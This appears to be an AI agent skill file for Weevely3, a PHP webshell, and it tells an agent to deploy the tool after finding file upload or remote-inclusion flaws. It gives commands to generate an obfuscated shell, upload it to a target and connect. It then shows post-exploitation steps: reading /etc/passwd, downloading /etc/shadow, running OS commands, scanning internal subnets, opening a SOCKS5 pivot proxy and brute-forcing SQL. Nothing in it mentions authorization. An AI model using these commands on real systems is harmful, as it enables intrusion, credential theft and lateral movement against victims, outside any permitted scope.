---
name: weevely3
description: "Stealth PHP webshell with 30+ post-exploitation modules for file ops, pivoting, and persistence. Use after file upload or RFI vulnerabilities to get an interactive PHP shell with built-in post-ex modules."
license: MIT
compatibility: "Python 3; Linux/macOS; github.com/epinna/weevely3"
metadata:
  author: AeonDave
  version: "1.0"
---

# Weevely3

Stealth PHP webshell with 30+ post-exploitation modules.

## Quick Start

```bash
git clone https://github.com/epinna/weevely3
cd weevely3 && pip3 install -r requirements.txt

# Generate obfuscated PHP shell
python3 weevely.py generate MyPassword shell.php
# Upload shell.php to target

# Connect
python3 weevely.py http://target.com/uploads/shell.php MyPassword
```

## Core Commands (in shell)

| Command | Purpose |
|---------|---------|
| `:help` | List all modules |
| `:file_read /etc/passwd` | Read file |
| `:file_download /etc/shadow /tmp/shadow` | Download file |
| `:file_upload /local/file /remote/path` | Upload file |
| `:shell_sh "id"` | Run OS command |
| `:net_scan 192.168.1.0/24 22,80,443` | Port scan |
| `:net_proxy socks5` | Start SOCKS5 proxy |
| `:audit_phpconf` | Audit PHP config |
| `:bruteforce_sql` | SQL brute-force |

## Common Workflows

**Full post-ex after upload:**
```
:shell_sh "id && uname -a"
:file_read /etc/passwd
:net_scan 10.10.10.0/24 22,80,443
:net_proxy socks5 0.0.0.0 1080
```

**Pivot via SOCKS5:**
```
:net_proxy socks5 127.0.0.1 1080
# Configure proxychains → proxychains nmap internal_host
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Module list and evasion options |
